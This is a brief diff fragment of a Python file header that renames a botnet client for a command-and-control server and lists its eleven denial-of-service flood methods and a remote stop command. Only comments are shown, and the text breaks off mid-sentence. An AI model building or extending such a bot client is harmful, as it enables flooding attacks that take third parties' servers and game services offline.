@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # ──────────────────────────────────────────────────────────────────────────
-#   Minimal bot client for “Sentinela” C2
+#   Minimal bot client for “15x3” C2
 #   • Supports 11 flood methods (.UDP .TCP .MIX .SYN .HEX .VSE .MCPE
 #     .FIVEM .HTTPGET .HTTPPOST .BROWSER)
 #   • Global STOP control: C2 sends the string "STOP" → every running
